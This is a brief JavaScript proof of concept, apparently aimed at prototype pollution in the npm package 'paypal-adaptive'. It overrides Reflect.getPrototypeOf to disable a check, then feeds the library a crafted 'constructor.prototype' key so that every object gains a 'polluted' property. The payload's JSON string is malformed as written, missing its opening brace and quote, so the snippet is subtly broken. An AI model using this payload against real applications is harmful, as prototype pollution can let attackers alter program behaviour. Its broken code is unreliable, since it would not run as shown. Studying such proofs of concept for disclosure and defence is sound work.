Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const PayPal = require('paypal-adaptive');
const p = new PayPal(JSON.parse('constructor.prototype": {"polluted": "yes"}, "userId": "foo", "password": "bar", "signature": "abcd", "appId": "1234", "sandbox": "1234"}'));
console.log({}.polluted);